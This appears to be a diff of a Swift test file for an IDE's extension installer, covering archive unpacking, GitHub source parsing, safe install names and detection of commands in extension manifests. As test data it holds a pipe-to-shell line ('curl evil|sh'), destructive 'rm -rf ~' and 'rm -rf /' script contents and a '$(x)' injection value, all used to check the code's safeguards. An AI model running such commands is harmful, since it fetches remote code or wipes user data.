@@ -13,33 +13,33 @@ import Testing
     try Data("mine".utf8).write(to: victim)
     try Data(#"{"id":"docker"}"#.utf8).write(to: top.appendingPathComponent("extension.json"))
     try FileManager.default.createSymbolicLink(
-        atPath: top.appendingPathComponent(IDE.sourceFile).path, withDestinationPath: victim.path)
+        atPath: top.appendingPathComponent(ExtensionFiles.sourceFile).path, withDestinationPath: victim.path)
     let archive = work.appendingPathComponent("a.tgz")
     let r = try Subprocess.run(
         ["/usr/bin/tar", "-czf", archive.path, "-C", work.path, "repo-main"], cwd: work.path, env: [:], timeLimit: 20)
     #expect(r.status == 0)
     try FileManager.default.removeItem(at: top)
-    _ = try IDE.unpackExtension(archive, path: "", source: "https://github.com/me/repo", work: work)
+    _ = try ExtensionFiles.unpackExtension(archive, path: "", source: "https://github.com/me/repo", work: work)
     #expect(try String(contentsOf: victim, encoding: .utf8) == "mine")
 }
 
 @Test func gitHubFoldersAreRead() {
-    #expect(IDE.librarySource("https://github.com/me/exts")! == ("me/exts", "HEAD", ""))
-    #expect(IDE.librarySource("github.com/me/exts.git/")! == ("me/exts", "HEAD", ""))
-    #expect(IDE.librarySource("me/exts")! == ("me/exts", "HEAD", ""))
+    #expect(ExtensionFiles.librarySource("https://github.com/me/exts")! == ("me/exts", "HEAD", ""))
+    #expect(ExtensionFiles.librarySource("github.com/me/exts.git/")! == ("me/exts", "HEAD", ""))
+    #expect(ExtensionFiles.librarySource("me/exts")! == ("me/exts", "HEAD", ""))
     #expect(
-        IDE.librarySource("https://github.com/me/exts/tree/v1.2/extensions/docker")! == (
+        ExtensionFiles.librarySource("https://github.com/me/exts/tree/v1.2/extensions/docker")! == (
             "me/exts", "v1.2", "extensions/docker"
         ))
     for bad in [
         "docker", "https://github.com/me", "me/exts/blob/main/a", "me/exts/tree", "me/exts/tree/main/../..", "me/ex ts",
         "me/-/tree/$(x)/a"
     ] {
-        #expect(IDE.librarySource(bad) == nil, "\(bad)")
+        #expect(ExtensionFiles.librarySource(bad) == nil, "\(bad)")
     }
-    let s = IDE.librarySource("github.com/me/exts/tree/abc/extensions/docker")!
-    #expect(IDE.sourceURL(s) == "https://github.com/me/exts/tree/abc/extensions/docker")
-    #expect(IDE.sourceURL(("me/exts", "HEAD", "")) == "https://github.com/me/exts")
+    let s = ExtensionFiles.librarySource("github.com/me/exts/tree/abc/extensions/docker")!
+    #expect(ExtensionFiles.sourceURL(s) == "https://github.com/me/exts/tree/abc/extensions/docker")
+    #expect(ExtensionFiles.sourceURL(("me/exts", "HEAD", "")) == "https://github.com/me/exts")
 }
 
 /// A GitHub archive (one top folder) → the extension's folder under its id, with where it came from; a folder without
@@ -76,26 +76,33 @@ import Testing
         "extensions/docker/extension.json": #"{"id": "docker", "name": "Docker"}"#, "extensions/docker/README.md": "hi",
         "README.md": "repo"
     ])
-    let got = try IDE.unpackExtension(
+    let got = try ExtensionFiles.unpackExtension(
         a, path: "extensions/docker", source: "https://github.com/me/exts/tree/abc/extensions/docker", work: try work())
     #expect(got.lastPathComponent == "docker")
-    #expect(Set(try fm.contentsOfDirectory(atPath: got.path)) == ["extension.json", "README.md", IDE.sourceFile])
-    #expect(IDE.extensionSource(got) == "https://github.com/me/exts/tree/abc/extensions/docker")
+    #expect(
+        Set(try fm.contentsOfDirectory(atPath: got.path)) == ["extension.json", "README.md", ExtensionFiles.sourceFile])
+    #expect(ExtensionFiles.extensionSource(got) == "https://github.com/me/exts/tree/abc/extensions/docker")
 
     let root = try archive(["extension.json": #"{"id": "solo", "name": "Solo"}"#])
     #expect(
-        try IDE.unpackExtension(root, path: "", source: "https://github.com/me/solo", work: try work())
+        try ExtensionFiles.unpackExtension(root, path: "", source: "https://github.com/me/solo", work: try work())
             .lastPathComponent == "solo")
 
-    #expect(throws: RPCError.self) { try IDE.unpackExtension(a, path: "nope", source: "s", work: try work()) }
+    #expect(throws: RPCError.self) {
+        try ExtensionFiles.unpackExtension(a, path: "nope", source: "s", work: try work())
+    }
     let badID = try archive(["extension.json": #"{"id": "../evil", "name": "E"}"#])
-    #expect(throws: RPCError.self) { try IDE.unpackExtension(badID, path: "", source: "s", work: try work()) }
+    #expect(throws: RPCError.self) {
+        try ExtensionFiles.unpackExtension(badID, path: "", source: "s", work: try work())
+    }
     let outside = dir.appendingPathComponent("outside")
     try Paths.ensure(outside)
     try #"{"id": "out", "name": "O"}"#.write(
         to: outside.appendingPathComponent("extension.json"), atomically: true, encoding: .utf8)
     let link = try archive(["README.md": "x"], links: ["ext": outside.path])
-    #expect(throws: RPCError.self) { try IDE.unpackExtension(link, path: "ext", source: "s", work: try work()) }
+    #expect(throws: RPCError.self) {
+        try ExtensionFiles.unpackExtension(link, path: "ext", source: "s", work: try work())
+    }
 }
 
 /// Installing over one that's there sends the old one to the Trash; a name that isn't one folder is refused.
@@ -106,14 +113,14 @@ import Testing
     let src = dir.appendingPathComponent("src/docker"), into = dir.appendingPathComponent("extensions")
     try Paths.ensure(src)
     try "v1".write(to: src.appendingPathComponent("extension.json"), atomically: true, encoding: .utf8)
-    try IDE.installExtension(src, as: "docker", in: into)
+    try ExtensionFiles.installExtension(src, as: "docker", in: into)
     try "v2".write(to: src.appendingPathComponent("extension.json"), atomically: true, encoding: .utf8)
-    let dest = try IDE.installExtension(src, as: "docker", in: into, move: true)
+    let dest = try ExtensionFiles.installExtension(src, as: "docker", in: into, move: true)
     #expect(try String(contentsOf: dest.appendingPathComponent("extension.json"), encoding: .utf8) == "v2")
     #expect(!fm.fileExists(atPath: src.path))
     for bad in ["..", ".", "", "a/b", "../x", ".hidden"] {
-        #expect(throws: RPCError.self, "\(bad)") { try IDE.installExtension(dest, as: bad, in: into) }
-        #expect(!IDE.isPlainName(bad))
+        #expect(throws: RPCError.self, "\(bad)") { try ExtensionFiles.installExtension(dest, as: bad, in: into) }
+        #expect(!ExtensionFiles.isPlainName(bad))
     }
 }
 
@@ -130,7 +137,7 @@ import Testing
               "themes": [{"id": "t", "terminal": {"background": "#000"}}],
               "languages": [{"id": "py", "server": {"command": "pyright", "install": "npm i -g pyright"}, "format": "ruff format -"}]}}
             """#.utf8))
-    let (commands, pages) = IDE.commandsIn(m)
+    let (commands, pages) = ExtensionFiles.commandsIn(m)
     #expect(
         Set(commands) == ["docker ps", "docker logs ${ID}", "pyright", "npm i -g pyright", "ruff format -"]
             && commands.count == 5)
@@ -148,19 +155,9 @@ import Testing
                                                                                         {"title": "Page", "open": "https://x"}]}}],
               "agents": [{"id": "a", "name": "A", "command": "sh", "args": ["-c", "curl evil|sh"]}]}}
             """#.utf8))
-    let commands = IDE.commandsIn(m).commands
+    let commands = ExtensionFiles.commandsIn(m).commands
     #expect(commands.contains("terminal:?cmd=curl evil|sh") && commands.contains("sh -c curl evil|sh"))
     #expect(!commands.contains("https://x"))
-}
-
-/// A chunk cut inside a character keeps its start for the next one; a whole one is left as it is.
-@Test func aCharacterCutBetweenChunksIsKeptForTheNext() {
-    let bytes = Data("a…b🙂".utf8)   // … is 3 bytes, 🙂 4
-    let (whole, rest) = UTF8Chunks.split(bytes.prefix(3))   // "a" + 2 of …'s 3
-    #expect(whole == Data("a".utf8) && rest.count == 2)
-    #expect(String(decoding: rest + bytes[3..<5], as: UTF8.self) == "…b")
-    #expect(UTF8Chunks.split(bytes).rest.isEmpty && UTF8Chunks.split(bytes.prefix(bytes.count - 1)).rest.count == 3)
-    #expect(UTF8Chunks.split(Data()).whole.isEmpty && UTF8Chunks.split(Data([0x80, 0x80, 0x80, 0x80])).rest.isEmpty)
 }
 
 /// Allowing an extension covers every file of its folder, not its `.git`: a script changed after it was allowed is
@@ -172,16 +169,16 @@ import Testing
     try FileManager.default.createDirectory(at: dir.appendingPathComponent(".git"), withIntermediateDirectories: true)
     try Data("{}".utf8).write(to: dir.appendingPathComponent("extension.json"))
     try Data("echo hi".utf8).write(to: dir.appendingPathComponent("bin/run.sh"))
-    let first = IDE.extensionDigest(dir)
+    let first = ExtensionFiles.extensionDigest(dir)
     try Data("ref".utf8).write(to: dir.appendingPathComponent(".git/HEAD"))
-    #expect(IDE.extensionDigest(dir) == first)
+    #expect(ExtensionFiles.extensionDigest(dir) == first)
     try Data("rm -rf ~".utf8).write(to: dir.appendingPathComponent("bin/run.sh"))
-    let second = IDE.extensionDigest(dir)
-    #expect(second != first && IDE.extensionDigest(IDE.extensionFiles(dir)) == second)
+    let second = ExtensionFiles.extensionDigest(dir)
+    #expect(second != first && ExtensionFiles.extensionDigest(ExtensionFiles.extensionFiles(dir)) == second)
     // Same size, its old time put back: still read again (its ctime moved).
     let script = dir.appendingPathComponent("bin/run.sh").path
     let was = try FileManager.default.attributesOfItem(atPath: script)[.modificationDate] as? Date
     try Data("rm -rf /".utf8).write(to: URL(fileURLWithPath: script))
     try FileManager.default.setAttributes([.modificationDate: was ?? Date()], ofItemAtPath: script)
-    #expect(IDE.extensionDigest(dir) != second)
+    #expect(ExtensionFiles.extensionDigest(dir) != second)
 }
